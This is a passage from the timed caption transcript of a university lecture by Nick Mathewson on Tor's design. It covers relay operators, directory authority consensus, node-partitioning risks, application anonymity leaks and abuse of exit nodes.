              <time_slice>36:49</time_slice>
              <text_slice>than categorically
guarantee-able.</text_slice>
            </slice>
            <slice>
              <time_slice>36:52</time_slice>
              <text_slice>So instead of asking,
does this protect</text_slice>
            </slice>
            <slice>
              <time_slice>36:56</time_slice>
              <text_slice>Alice, the kind of
questions you could ask</text_slice>
            </slice>
            <slice>
              <time_slice>36:58</time_slice>
              <text_slice>are, under this assumption
about hacker capabilities, how</text_slice>
            </slice>
            <slice>
              <time_slice>37:02</time_slice>
              <text_slice>much traffic can
Alice safely send</text_slice>
            </slice>
            <slice>
              <time_slice>37:04</time_slice>
              <text_slice>if she wants a 99% chance of not
being linked to her activities?</text_slice>
            </slice>
            <slice>
              <time_slice>37:10</time_slice>
              <text_slice>So will anyone actually
run these things?</text_slice>
            </slice>
            <slice>
              <time_slice>37:13</time_slice>
              <text_slice>That was an opening
question when we started.</text_slice>
            </slice>
            <slice>
              <time_slice>37:15</time_slice>
              <text_slice>We didn't know whether
the system would actually</text_slice>
            </slice>
            <slice>
              <time_slice>37:17</time_slice>
              <text_slice>take off or not.</text_slice>
            </slice>
            <slice>
              <time_slice>37:18</time_slice>
              <text_slice>So the only [INAUDIBLE]
try to see what happens.</text_slice>
            </slice>
            <slice>
              <time_slice>37:25</time_slice>
              <text_slice>We got a fair amount
of volunteer operators.</text_slice>
            </slice>
            <slice>
              <time_slice>37:28</time_slice>
              <text_slice>A fair number of non-profits
have formed whose sole purpose</text_slice>
            </slice>
            <slice>
              <time_slice>37:33</time_slice>
              <text_slice>is just to take donations and
use it to buy bandwidth and run</text_slice>
            </slice>
            <slice>
              <time_slice>37:36</time_slice>
              <text_slice>Tor nodes.</text_slice>
            </slice>
            <slice>
              <time_slice>37:38</time_slice>
              <text_slice>And there are also universities.</text_slice>
            </slice>
            <slice>
              <time_slice>37:40</time_slice>
              <text_slice>There's also private companies.</text_slice>
            </slice>
            <slice>
              <time_slice>37:42</time_slice>
              <text_slice>For a while, [INAUDIBLE]
was running a Tor server</text_slice>
            </slice>
            <slice>
              <time_slice>37:44</time_slice>
              <text_slice>out of their security
team because they</text_slice>
            </slice>
            <slice>
              <time_slice>37:47</time_slice>
              <text_slice>thought it was fun.</text_slice>
            </slice>
            <slice>
              <time_slice>37:52</time_slice>
              <text_slice>The legal issues there--
again, I'm not a lawyer.</text_slice>
            </slice>
            <slice>
              <time_slice>37:54</time_slice>
              <text_slice>I can't offer legal advice.</text_slice>
            </slice>
            <slice>
              <time_slice>37:55</time_slice>
              <text_slice>But five different people
asked about legal issues.</text_slice>
            </slice>
            <slice>
              <time_slice>38:00</time_slice>
              <text_slice>As far as I can tell,
in the US at least,</text_slice>
            </slice>
            <slice>
              <time_slice>38:01</time_slice>
              <text_slice>there's no legal impediment
to running a Tor server.</text_slice>
            </slice>
            <slice>
              <time_slice>38:04</time_slice>
              <text_slice>And that seems to be the case
throughout most of Europe</text_slice>
            </slice>
            <slice>
              <time_slice>38:07</time_slice>
              <text_slice>as far as I'm aware.</text_slice>
            </slice>
            <slice>
              <time_slice>38:09</time_slice>
              <text_slice>In places that generally
have less internet freedom,</text_slice>
            </slice>
            <slice>
              <time_slice>38:12</time_slice>
              <text_slice>it's a dicier proposition.</text_slice>
            </slice>
            <slice>
              <time_slice>38:14</time_slice>
              <text_slice>The issues to be
concerned about are not,</text_slice>
            </slice>
            <slice>
              <time_slice>38:16</time_slice>
              <text_slice>is it illegal to
run a Tor server,</text_slice>
            </slice>
            <slice>
              <time_slice>38:19</time_slice>
              <text_slice>but if somebody does something
illegal or undesirable</text_slice>
            </slice>
            <slice>
              <time_slice>38:24</time_slice>
              <text_slice>with my Tor server, will
my ISP shut me down,</text_slice>
            </slice>
            <slice>
              <time_slice>38:28</time_slice>
              <text_slice>and will law
enforcement believe, oh,</text_slice>
            </slice>
            <slice>
              <time_slice>38:32</time_slice>
              <text_slice>you're just running
a Tor server,</text_slice>
            </slice>
            <slice>
              <time_slice>38:34</time_slice>
              <text_slice>or will they seize the
computer to make sure?</text_slice>
            </slice>
            <slice>
              <time_slice>38:37</time_slice>
              <text_slice>For those, I would suggest
not running the Tor server out</text_slice>
            </slice>
            <slice>
              <time_slice>38:39</time_slice>
              <text_slice>of your dorm room.</text_slice>
            </slice>
            <slice>
              <time_slice>38:42</time_slice>
              <text_slice>Excuse me, don't run an
exit out of your dorm room,</text_slice>
            </slice>
            <slice>
              <time_slice>38:45</time_slice>
              <text_slice>or really out of your dorm room,
assuming the network policy</text_slice>
            </slice>
            <slice>
              <time_slice>38:48</time_slice>
              <text_slice>allows that.</text_slice>
            </slice>
            <slice>
              <time_slice>38:49</time_slice>
              <text_slice>I have no idea.</text_slice>
            </slice>
            <slice>
              <time_slice>38:50</time_slice>
              <text_slice>They've changed so
much since I was a kid.</text_slice>
            </slice>
            <slice>
              <time_slice>38:55</time_slice>
              <text_slice>Running an exit out of your dorm
room could get you in trouble.</text_slice>
            </slice>
            <slice>
              <time_slice>38:57</time_slice>
              <text_slice>But running a non-exit relay
that doesn't deliver traffic</text_slice>
            </slice>
            <slice>
              <time_slice>39:01</time_slice>
              <text_slice>to the internet is less
likely to create those issues</text_slice>
            </slice>
            <slice>
              <time_slice>39:05</time_slice>
              <text_slice>in particular.</text_slice>
            </slice>
            <slice>
              <time_slice>39:10</time_slice>
              <text_slice>But if you do it in
a nice co-lo site,</text_slice>
            </slice>
            <slice>
              <time_slice>39:12</time_slice>
              <text_slice>and you get your
ISP's permission,</text_slice>
            </slice>
            <slice>
              <time_slice>39:14</time_slice>
              <text_slice>then it's a pretty
reasonable thing to do.</text_slice>
            </slice>
            <slice>
              <time_slice>39:19</time_slice>
              <text_slice>Let's see, someone asked,
well, what if users</text_slice>
            </slice>
            <slice>
              <time_slice>39:23</time_slice>
              <text_slice>don't trust a particular node?</text_slice>
            </slice>
            <slice>
              <time_slice>39:24</time_slice>
              <text_slice>And this brings me
to my next topic.</text_slice>
            </slice>
            <slice>
              <time_slice>39:29</time_slice>
              <text_slice>So the software the clients
use, you can't tell it,</text_slice>
            </slice>
            <slice>
              <time_slice>39:32</time_slice>
              <text_slice>don't use this one, don't use
this one, only use this one.</text_slice>
            </slice>
            <slice>
              <time_slice>39:35</time_slice>
              <text_slice>But remember that anonymity
loves company principle.</text_slice>
            </slice>
            <slice>
              <time_slice>39:39</time_slice>
              <text_slice>If I'm only using
three nodes, and you're</text_slice>
            </slice>
            <slice>
              <time_slice>39:43</time_slice>
              <text_slice>using three different
nodes, and you're</text_slice>
            </slice>
            <slice>
              <time_slice>39:45</time_slice>
              <text_slice>using three different nodes,
our traffic will not mix at all.</text_slice>
            </slice>
            <slice>
              <time_slice>39:49</time_slice>
              <text_slice>To the extent that we partition
off which parts of the network</text_slice>
            </slice>
            <slice>
              <time_slice>39:52</time_slice>
              <text_slice>we use, we are distinguishable
from one another.</text_slice>
            </slice>
            <slice>
              <time_slice>39:55</time_slice>
              <text_slice>Now, if I just exclude
one or two nodes,</text_slice>
            </slice>
            <slice>
              <time_slice>39:57</time_slice>
              <text_slice>and you just exclude
one or two nodes,</text_slice>
            </slice>
            <slice>
              <time_slice>40:00</time_slice>
              <text_slice>that's not a big partitioning,
and that doesn't help</text_slice>
            </slice>
            <slice>
              <time_slice>40:03</time_slice>
              <text_slice>distinguish-ability that much.</text_slice>
            </slice>
            <slice>
              <time_slice>40:05</time_slice>
              <text_slice>But it would be good to
the extent possible to have</text_slice>
            </slice>
            <slice>
              <time_slice>40:08</time_slice>
              <text_slice>everyone using the same nodes.</text_slice>
            </slice>
            <slice>
              <time_slice>40:12</time_slice>
              <text_slice>So all right, how do
we accomplish that?</text_slice>
            </slice>
            <slice>
              <time_slice>40:14</time_slice>
              <text_slice>So version one, in the
first version of Tor,</text_slice>
            </slice>
            <slice>
              <time_slice>40:16</time_slice>
              <text_slice>we just chipped a list
of all of the nodes.</text_slice>
            </slice>
            <slice>
              <time_slice>40:18</time_slice>
              <text_slice>I think there were three of
them, or five, or something.</text_slice>
            </slice>
            <slice>
              <time_slice>40:21</time_slice>
              <text_slice>No, I think there
were about six,</text_slice>
            </slice>
            <slice>
              <time_slice>40:22</time_slice>
              <text_slice>of which three were all
running on the same computer</text_slice>
            </slice>
            <slice>
              <time_slice>40:25</time_slice>
              <text_slice>in a closet at LCS
in Tech Square.</text_slice>
            </slice>
            <slice>
              <time_slice>40:30</time_slice>
              <text_slice>All right, so that
wasn't a good idea.</text_slice>
            </slice>
            <slice>
              <time_slice>40:32</time_slice>
              <text_slice>Because nodes can
go up and down.</text_slice>
            </slice>
            <slice>
              <time_slice>40:34</time_slice>
              <text_slice>Nodes change.</text_slice>
            </slice>
            <slice>
              <time_slice>40:35</time_slice>
              <text_slice>You don't want to
have to put out</text_slice>
            </slice>
            <slice>
              <time_slice>40:36</time_slice>
              <text_slice>a new release of your
software every time somebody</text_slice>
            </slice>
            <slice>
              <time_slice>40:39</time_slice>
              <text_slice>joins to release the network.</text_slice>
            </slice>
            <slice>
              <time_slice>40:41</time_slice>
              <text_slice>So you could just
have every node keep</text_slice>
            </slice>
            <slice>
              <time_slice>40:44</time_slice>
              <text_slice>a list of all the other nodes
that are connected to it</text_slice>
            </slice>
            <slice>
              <time_slice>40:46</time_slice>
              <text_slice>and all advertise to each other.</text_slice>
            </slice>
            <slice>
              <time_slice>40:48</time_slice>
              <text_slice>And then when a client
connects, a client just</text_slice>
            </slice>
            <slice>
              <time_slice>40:50</time_slice>
              <text_slice>has to know one
node and then says,</text_slice>
            </slice>
            <slice>
              <time_slice>40:51</time_slice>
              <text_slice>hey, who's on the network?</text_slice>
            </slice>
            <slice>
              <time_slice>40:53</time_slice>
              <text_slice>And actually, a lot
of designs people</text_slice>
            </slice>
            <slice>
              <time_slice>40:54</time_slice>
              <text_slice>have built work this way.</text_slice>
            </slice>
            <slice>
              <time_slice>40:57</time_slice>
              <text_slice>A lot of early peer to
peer anonymity designs work</text_slice>
            </slice>
            <slice>
              <time_slice>40:59</time_slice>
              <text_slice>this way.</text_slice>
            </slice>
            <slice>
              <time_slice>41:00</time_slice>
              <text_slice>But it's a terrible idea.</text_slice>
            </slice>
            <slice>
              <time_slice>41:01</time_slice>
              <text_slice>Because if you go to one node
and say, who's on the network,</text_slice>
            </slice>
            <slice>
              <time_slice>41:04</time_slice>
              <text_slice>and you believe them, well,
if I'm that node, I can say,</text_slice>
            </slice>
            <slice>
              <time_slice>41:07</time_slice>
              <text_slice>yes, I'm on the network,
and my friend over here</text_slice>
            </slice>
            <slice>
              <time_slice>41:11</time_slice>
              <text_slice>is on the network, and my friend
over here is on the network,</text_slice>
            </slice>
            <slice>
              <time_slice>41:14</time_slice>
              <text_slice>and no one else
is on the network.</text_slice>
            </slice>
            <slice>
              <time_slice>41:15</time_slice>
              <text_slice>And I can tell you any
number of fake nodes</text_slice>
            </slice>
            <slice>
              <time_slice>41:18</time_slice>
              <text_slice>that are all operated by me
and capture all of your traffic</text_slice>
            </slice>
            <slice>
              <time_slice>41:22</time_slice>
              <text_slice>that way with what's called
a row capture attack.</text_slice>
            </slice>
            <slice>
              <time_slice>41:25</time_slice>
              <text_slice>OK, so maybe we just
have a single directory</text_slice>
            </slice>
            <slice>
              <time_slice>41:28</time_slice>
              <text_slice>operated by a trusted party.</text_slice>
            </slice>
            <slice>
              <time_slice>41:30</time_slice>
              <text_slice>That's not so good as a
single point of failure.</text_slice>
            </slice>
            <slice>
              <time_slice>41:33</time_slice>
              <text_slice>So OK, let's have
multiple trusted parties.</text_slice>
            </slice>
            <slice>
              <time_slice>41:38</time_slice>
              <text_slice>And clients go to these
multiple trusted parties</text_slice>
            </slice>
            <slice>
              <time_slice>41:41</time_slice>
              <text_slice>and get a list of all of
the nodes from all of them</text_slice>
            </slice>
            <slice>
              <time_slice>41:43</time_slice>
              <text_slice>and combine those lists.</text_slice>
            </slice>
            <slice>
              <time_slice>41:47</time_slice>
              <text_slice>Then you're
actually-- first off,</text_slice>
            </slice>
            <slice>
              <time_slice>41:49</time_slice>
              <text_slice>you're partitioned in that case.</text_slice>
            </slice>
            <slice>
              <time_slice>41:51</time_slice>
              <text_slice>If I choose these three,
and you choose those three,</text_slice>
            </slice>
            <slice>
              <time_slice>41:54</time_slice>
              <text_slice>and they say anything
different, then we'll</text_slice>
            </slice>
            <slice>
              <time_slice>41:55</time_slice>
              <text_slice>be using different
sets of nodes.</text_slice>
            </slice>
            <slice>
              <time_slice>41:57</time_slice>
              <text_slice>So that's still not good.</text_slice>
            </slice>
            <slice>
              <time_slice>41:58</time_slice>
              <text_slice>Also, there's
still a [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>42:01</time_slice>
              <text_slice>where if I use the intersection
of the sets they tell me,</text_slice>
            </slice>
            <slice>
              <time_slice>42:08</time_slice>
              <text_slice>then any one of them can keep
me from using a node they</text_slice>
            </slice>
            <slice>
              <time_slice>42:11</time_slice>
              <text_slice>don't like by not listing it.</text_slice>
            </slice>
            <slice>
              <time_slice>42:13</time_slice>
              <text_slice>If I use the union,
anyone can flood me</text_slice>
            </slice>
            <slice>
              <time_slice>42:16</time_slice>
              <text_slice>by making 20,000 fake servers
that are all on the list.</text_slice>
            </slice>
            <slice>
              <time_slice>42:21</time_slice>
              <text_slice>I might compute the result
of some sort of vote</text_slice>
            </slice>
            <slice>
              <time_slice>42:24</time_slice>
              <text_slice>on them, which would
solve those two problems.</text_slice>
            </slice>
            <slice>
              <time_slice>42:26</time_slice>
              <text_slice>But I'd still be
partitioned from everyone</text_slice>
            </slice>
            <slice>
              <time_slice>42:28</time_slice>
              <text_slice>who's using different
trusted parties.</text_slice>
            </slice>
            <slice>
              <time_slice>42:32</time_slice>
              <text_slice>We could do a magical DHT.</text_slice>
            </slice>
            <slice>
              <time_slice>42:35</time_slice>
              <text_slice>Have we done
[INAUDIBLE] hash tables?</text_slice>
            </slice>
            <slice>
              <time_slice>42:36</time_slice>
              <text_slice>All right, we could do some
sort of magical distributed</text_slice>
            </slice>
            <slice>
              <time_slice>42:39</time_slice>
              <text_slice>structure run across
all of the nodes.</text_slice>
            </slice>
            <slice>
              <time_slice>42:43</time_slice>
              <text_slice>I say magical, because although
there are designs in this area,</text_slice>
            </slice>
            <slice>
              <time_slice>42:50</time_slice>
              <text_slice>and some better than
others, none of them</text_slice>
            </slice>
            <slice>
              <time_slice>42:54</time_slice>
              <text_slice>really seem to have a solid
security evidence for it</text_slice>
            </slice>
            <slice>
              <time_slice>42:58</time_slice>
              <text_slice>at this point to
the point where I</text_slice>
            </slice>
            <slice>
              <time_slice>43:00</time_slice>
              <text_slice>would be comfortable in saying,
yes, this is actually secure.</text_slice>
            </slice>
            <slice>
              <time_slice>43:04</time_slice>
              <text_slice>So the solution we
wound up with is</text_slice>
            </slice>
            <slice>
              <time_slice>43:06</time_slice>
              <text_slice>have multiple hardened
trusted authorities run</text_slice>
            </slice>
            <slice>
              <time_slice>43:10</time_slice>
              <text_slice>by trusted parties that
collect lists of nodes</text_slice>
            </slice>
            <slice>
              <time_slice>43:14</time_slice>
              <text_slice>that vote hourly on
which nodes are running</text_slice>
            </slice>
            <slice>
              <time_slice>43:17</time_slice>
              <text_slice>that can vote to exclude nodes
that seem to be misbehaving</text_slice>
            </slice>
            <slice>
              <time_slice>43:21</time_slice>
              <text_slice>that are all running on the
same slash 16 that are doing</text_slice>
            </slice>
            <slice>
              <time_slice>43:25</time_slice>
              <text_slice>strange things to
traffic, and have</text_slice>
            </slice>
            <slice>
              <time_slice>43:29</time_slice>
              <text_slice>them form a consensus that's
a result of their votes.</text_slice>
            </slice>
            <slice>
              <time_slice>43:34</time_slice>
              <text_slice>And everybody signs
the consensus.</text_slice>
            </slice>
            <slice>
              <time_slice>43:36</time_slice>
              <text_slice>And clients don't
use it unless it's</text_slice>
            </slice>
            <slice>
              <time_slice>43:37</time_slice>
              <text_slice>signed by enough authorities.</text_slice>
            </slice>
            <slice>
              <time_slice>43:39</time_slice>
              <text_slice>This is not the final design.</text_slice>
            </slice>
            <slice>
              <time_slice>43:40</time_slice>
              <text_slice>But it's the best we've
managed to come up with so far.</text_slice>
            </slice>
            <slice>
              <time_slice>43:44</time_slice>
              <text_slice>And this way, all you
need to distribute</text_slice>
            </slice>
            <slice>
              <time_slice>43:46</time_slice>
              <text_slice>with clients is a list of all
of the authorities' public keys</text_slice>
            </slice>
            <slice>
              <time_slice>43:51</time_slice>
              <text_slice>and some places to
get the directories.</text_slice>
            </slice>
            <slice>
              <time_slice>43:54</time_slice>
              <text_slice>You want to have all the nodes
cache these directory things.</text_slice>
            </slice>
            <slice>
              <time_slice>43:58</time_slice>
              <text_slice>Because if you don't, the
bandwidth load on authorities</text_slice>
            </slice>
            <slice>
              <time_slice>44:00</time_slice>
              <text_slice>is catastrophic.</text_slice>
            </slice>
            <slice>
              <time_slice>44:04</time_slice>
              <text_slice>So I'm going to skip over that.</text_slice>
            </slice>
            <slice>
              <time_slice>44:06</time_slice>
              <text_slice>Because I would love
to talk about how</text_slice>
            </slice>
            <slice>
              <time_slice>44:11</time_slice>
              <text_slice>clients should
choose which paths</text_slice>
            </slice>
            <slice>
              <time_slice>44:13</time_slice>
              <text_slice>to build through the network.</text_slice>
            </slice>
            <slice>
              <time_slice>44:14</time_slice>
              <text_slice>I would love to talk
about issues applications</text_slice>
            </slice>
            <slice>
              <time_slice>44:17</time_slice>
              <text_slice>and making applications
not deanonymize themselves.</text_slice>
            </slice>
            <slice>
              <time_slice>44:20</time_slice>
              <text_slice>I'd love to talk about abuse.</text_slice>
            </slice>
            <slice>
              <time_slice>44:21</time_slice>
              <text_slice>I'd love to talk about hidden
services and how they work.</text_slice>
            </slice>
            <slice>
              <time_slice>44:24</time_slice>
              <text_slice>I'd love to talk about
censorship resistance.</text_slice>
            </slice>
            <slice>
              <time_slice>44:27</time_slice>
              <text_slice>And I'd like to talk about
attacks and defenses.</text_slice>
            </slice>
            <slice>
              <time_slice>44:30</time_slice>
              <text_slice>But I've only got 35 minutes.</text_slice>
            </slice>
            <slice>
              <time_slice>44:34</time_slice>
              <text_slice>And I can't possibly
cover all of these.</text_slice>
            </slice>
            <slice>
              <time_slice>44:36</time_slice>
              <text_slice>So show of hands
for how many people</text_slice>
            </slice>
            <slice>
              <time_slice>44:38</time_slice>
              <text_slice>think the most important--
think about what you think</text_slice>
            </slice>
            <slice>
              <time_slice>44:42</time_slice>
              <text_slice>are the two most important
topics on this list.</text_slice>
            </slice>
            <slice>
              <time_slice>44:45</time_slice>
              <text_slice>If one of your two
most important topics</text_slice>
            </slice>
            <slice>
              <time_slice>44:47</time_slice>
              <text_slice>is path selection and
how you choose nodes,</text_slice>
            </slice>
            <slice>
              <time_slice>44:49</time_slice>
              <text_slice>please raise your hand.</text_slice>
            </slice>
            <slice>
              <time_slice>44:51</time_slice>
              <text_slice>If one of your two
most important topics</text_slice>
            </slice>
            <slice>
              <time_slice>44:53</time_slice>
              <text_slice>is application issues and
how to make applications not</text_slice>
            </slice>
            <slice>
              <time_slice>44:57</time_slice>
              <text_slice>bust your anonymity,
please raise your hand.</text_slice>
            </slice>
            <slice>
              <time_slice>45:00</time_slice>
              <text_slice>If one of your most
important issues</text_slice>
            </slice>
            <slice>
              <time_slice>45:02</time_slice>
              <text_slice>is abuse and what kind of abuse
we see, how you can prevent it,</text_slice>
            </slice>
            <slice>
              <time_slice>45:05</time_slice>
              <text_slice>and how that works out,
please raise your hand.</text_slice>
            </slice>
            <slice>
              <time_slice>45:08</time_slice>
              <text_slice>OK, that one's popular.</text_slice>
            </slice>
            <slice>
              <time_slice>45:11</time_slice>
              <text_slice>If one of your most
important topics</text_slice>
            </slice>
            <slice>
              <time_slice>45:13</time_slice>
              <text_slice>is how these
services work and how</text_slice>
            </slice>
            <slice>
              <time_slice>45:14</time_slice>
              <text_slice>they can be made to work
better, please raise your hand.</text_slice>
            </slice>
            <slice>
              <time_slice>45:17</time_slice>
              <text_slice>Wow, that's much more popular
on this side of the room</text_slice>
            </slice>
            <slice>
              <time_slice>45:19</time_slice>
              <text_slice>than that side of the room.</text_slice>
            </slice>
            <slice>
              <time_slice>45:20</time_slice>
              <text_slice>What's going on?</text_slice>
            </slice>
            <slice>
              <time_slice>45:23</time_slice>
              <text_slice>You guys in a club?</text_slice>
            </slice>
            <slice>
              <time_slice>45:24</time_slice>
              <text_slice>Are you up to something?</text_slice>
            </slice>
            <slice>
              <time_slice>45:26</time_slice>
              <text_slice>Censorship, who's
interested in censorship?</text_slice>
            </slice>
            <slice>
              <time_slice>45:29</time_slice>
              <text_slice>OK, that's fairly popular.</text_slice>
            </slice>
            <slice>
              <time_slice>45:32</time_slice>
              <text_slice>Attacks and defenses?</text_slice>
            </slice>
            <slice>
              <time_slice>45:36</time_slice>
              <text_slice>OK, so we're not doing paths
and we're not doing apps.</text_slice>
            </slice>
            <slice>
              <time_slice>45:39</time_slice>
              <text_slice>So apps-- guard nodes, guard
nodes, C guard node designs,</text_slice>
            </slice>
            <slice>
              <time_slice>45:44</time_slice>
              <text_slice>select by bandwidth.</text_slice>
            </slice>
            <slice>
              <time_slice>45:46</time_slice>
              <text_slice>You need to actually
weight by bandwidth,</text_slice>
            </slice>
            <slice>
              <time_slice>45:48</time_slice>
              <text_slice>but you also need a trusted
way to measure bandwidth.</text_slice>
            </slice>
            <slice>
              <time_slice>45:51</time_slice>
              <text_slice>And that's the too long,
didn't lecture of what</text_slice>
            </slice>
            <slice>
              <time_slice>45:55</time_slice>
              <text_slice>would be on path selection.</text_slice>
            </slice>
            <slice>
              <time_slice>45:56</time_slice>
              <text_slice>For application issues,
almost no protocol</text_slice>
            </slice>
            <slice>
              <time_slice>45:59</time_slice>
              <text_slice>is actually designed
to provide anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>46:03</time_slice>
              <text_slice>Because almost every
protocol that's widely used</text_slice>
            </slice>
            <slice>
              <time_slice>46:06</time_slice>
              <text_slice>has the assumption
in it, well, you</text_slice>
            </slice>
            <slice>
              <time_slice>46:08</time_slice>
              <text_slice>know, anyone who
wants to can just</text_slice>
            </slice>
            <slice>
              <time_slice>46:09</time_slice>
              <text_slice>see the IPs on this traffic.</text_slice>
            </slice>
            <slice>
              <time_slice>46:12</time_slice>
              <text_slice>So there's no point in
trying to conceal identity.</text_slice>
            </slice>
            <slice>
              <time_slice>46:16</time_slice>
              <text_slice>So in a particularly
complex protocol,</text_slice>
            </slice>
            <slice>
              <time_slice>46:18</time_slice>
              <text_slice>like the whole stack of
protocols a web browser uses,</text_slice>
            </slice>
            <slice>
              <time_slice>46:22</time_slice>
              <text_slice>there's no real way
to anonymize that</text_slice>
            </slice>
            <slice>
              <time_slice>46:24</time_slice>
              <text_slice>just by anonymizing the traffic
with something like Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>46:27</time_slice>
              <text_slice>You need to hack the
web browser pretty hard</text_slice>
            </slice>
            <slice>
              <time_slice>46:30</time_slice>
              <text_slice>to make it stop doing things
like leaking the list of fonts</text_slice>
            </slice>
            <slice>
              <time_slice>46:32</time_slice>
              <text_slice>that are identified
on your system,</text_slice>
            </slice>
            <slice>
              <time_slice>46:34</time_slice>
              <text_slice>leaking your exact
window size, allowing</text_slice>
            </slice>
            <slice>
              <time_slice>46:38</time_slice>
              <text_slice>all kinds of permanent
cookie-like structures,</text_slice>
            </slice>
            <slice>
              <time_slice>46:41</time_slice>
              <text_slice>leaking what's in the cache
and what's not in the cache,</text_slice>
            </slice>
            <slice>
              <time_slice>46:44</time_slice>
              <text_slice>and so on.</text_slice>
            </slice>
            <slice>
              <time_slice>46:46</time_slice>
              <text_slice>So your choices
there are basically</text_slice>
            </slice>
            <slice>
              <time_slice>46:48</time_slice>
              <text_slice>isolate everything and restart
from a fresh VM all the time,</text_slice>
            </slice>
            <slice>
              <time_slice>46:52</time_slice>
              <text_slice>or reroute the browser, or both.</text_slice>
            </slice>
            <slice>
              <time_slice>46:53</time_slice>
              <text_slice>Other things are a lot
easier than web browsers,</text_slice>
            </slice>
            <slice>
              <time_slice>46:55</time_slice>
              <text_slice>but still problematic.</text_slice>
            </slice>
            <slice>
              <time_slice>46:56</time_slice>
              <text_slice>That's all I'm going to
say about app issues.</text_slice>
            </slice>
            <slice>
              <time_slice>47:00</time_slice>
              <text_slice>Let's see, I think
I got the most</text_slice>
            </slice>
            <slice>
              <time_slice>47:02</time_slice>
              <text_slice>hands-- did you see what
I got the most hands for,</text_slice>
            </slice>
            <slice>
              <time_slice>47:05</time_slice>
              <text_slice>any opinions?</text_slice>
            </slice>
            <slice>
              <time_slice>47:06</time_slice>
              <text_slice>STUDENT: Abuse and
hidden services?</text_slice>
            </slice>
            <slice>
              <time_slice>47:08</time_slice>
              <text_slice>NICK MATHEWSON: Abuse
and hidden services.</text_slice>
            </slice>
            <slice>
              <time_slice>47:09</time_slice>
              <text_slice>All right, I'll talk about
abuse and hidden services.</text_slice>
            </slice>
            <slice>
              <time_slice>47:12</time_slice>
              <text_slice>And if I've still got time,
I'll do censorship and attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>47:15</time_slice>
              <text_slice>So let's go to abuse--
abuse, abuse, abuse.</text_slice>
            </slice>
            <slice>
              <time_slice>47:22</time_slice>
              <text_slice>So one problem that
we've fortunately not</text_slice>
            </slice>
            <slice>
              <time_slice>47:26</time_slice>
              <text_slice>had all that much of-- so when
we were working on this stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>47:30</time_slice>
              <text_slice>the problem that
everybody was afraid of</text_slice>
            </slice>
            <slice>
              <time_slice>47:32</time_slice>
              <text_slice>was this horrible stuff that
would get you kicked off</text_slice>
            </slice>
            <slice>
              <time_slice>47:34</time_slice>
              <text_slice>of any ISP, and it would
create tremendous legal issues</text_slice>
            </slice>
            <slice>
              <time_slice>47:37</time_slice>
              <text_slice>and ruin your lives.</text_slice>
            </slice>
            <slice>
              <time_slice>47:38</time_slice>
              <text_slice>I speak of course
of file sharing.</text_slice>
            </slice>
            <slice>
              <time_slice>47:41</time_slice>
              <text_slice>We were terrified
that people would</text_slice>
            </slice>
            <slice>
              <time_slice>47:43</time_slice>
              <text_slice>try to BitTorrent or Gnutella
or whatever over this thing.</text_slice>
            </slice>
            <slice>
              <time_slice>47:48</time_slice>
              <text_slice>Yes, it was a long time ago.</text_slice>
            </slice>
            <slice>
              <time_slice>47:49</time_slice>
              <text_slice>And we thought about
how we'd do that.</text_slice>
            </slice>
            <slice>
              <time_slice>47:52</time_slice>
              <text_slice>Well, you'll see in the paper
that we talk a lot about exit</text_slice>
            </slice>
            <slice>
              <time_slice>47:55</time_slice>
              <text_slice>policies, about
letting exit nodes say,</text_slice>
            </slice>
            <slice>
              <time_slice>47:58</time_slice>
              <text_slice>I only allow connections
to port 80 and port 443.</text_slice>
            </slice>
            <slice>
              <time_slice>48:03</time_slice>
              <text_slice>This doesn't actually
help with abuse at all.</text_slice>
            </slice>
            <slice>
              <time_slice>48:05</time_slice>
              <text_slice>Because you can try to
spread worms over port 80.</text_slice>
            </slice>
            <slice>
              <time_slice>48:15</time_slice>
              <text_slice>You can post abusive stuff
to IRC channels over web</text_slice>
            </slice>
            <slice>
              <time_slice>48:21</time_slice>
              <text_slice>to IRC interfaces.</text_slice>
            </slice>
            <slice>
              <time_slice>48:23</time_slice>
              <text_slice>Everything's got a web
interface these days.</text_slice>
            </slice>
            <slice>
              <time_slice>48:26</time_slice>
              <text_slice>So you can't really
say, it's only web.</text_slice>
            </slice>
            <slice>
              <time_slice>48:29</time_slice>
              <text_slice>It's safe.</text_slice>
            </slice>
            <slice>
              <time_slice>48:30</time_slice>
              <text_slice>If it's useful,
it can be abused.</text_slice>
            </slice>
            <slice>
              <time_slice>48:33</time_slice>
              <text_slice>That said, there
are people who are</text_slice>
            </slice>
            <slice>
              <time_slice>48:35</time_slice>
              <text_slice>willing to run exits
that deliver 80 and 443</text_slice>
            </slice>
            <slice>
              <time_slice>48:39</time_slice>
              <text_slice>who would not be willing to
run exits delivering all ports.</text_slice>
            </slice>
            <slice>
              <time_slice>48:42</time_slice>
              <text_slice>So it did turn out to be useful.</text_slice>
            </slice>
            <slice>
              <time_slice>48:43</time_slice>
              <text_slice>It just didn't turn
out to be a solution.</text_slice>
            </slice>
            <slice>
              <time_slice>48:49</time_slice>
              <text_slice>Another thing that creates
problems is criminal activity</text_slice>
            </slice>
            <slice>
              <time_slice>48:54</time_slice>
              <text_slice>generally doesn't create
problems for the network</text_slice>
            </slice>
            <slice>
              <time_slice>48:56</time_slice>
              <text_slice>operators so much.</text_slice>
            </slice>
            <slice>
              <time_slice>48:58</time_slice>
              <text_slice>From time to time, somebody's
server gets seized and returned</text_slice>
            </slice>
            <slice>
              <time_slice>49:01</time_slice>
              <text_slice>six months later, and they
have to wipe the thing.</text_slice>
            </slice>
            <slice>
              <time_slice>49:04</time_slice>
              <text_slice>That's still an infrequent
enough occurrence</text_slice>
            </slice>
            <slice>
              <time_slice>49:07</time_slice>
              <text_slice>that it's somewhat
surprising when it happens.</text_slice>
            </slice>
            <slice>
              <time_slice>49:12</time_slice>
              <text_slice>And so yeah, don't run
an exit node on a server</text_slice>
            </slice>
            <slice>
              <time_slice>49:16</time_slice>
              <text_slice>that you need to graduate.</text_slice>
            </slice>
            <slice>
              <time_slice>49:23</time_slice>
              <text_slice>What else?</text_slice>
            </slice>
            <slice>
              <time_slice>49:27</time_slice>
              <text_slice>The biggest problem that
we have for abuse of stuff</text_slice>
            </slice>
            <slice>
              <time_slice>49:31</time_slice>
              <text_slice>is that many websites
around the world,</text_slice>
            </slice>
            <slice>
              <time_slice>49:34</time_slice>
              <text_slice>and many IRC
services and so one,</text_slice>
            </slice>
            <slice>
              <time_slice>49:36</time_slice>
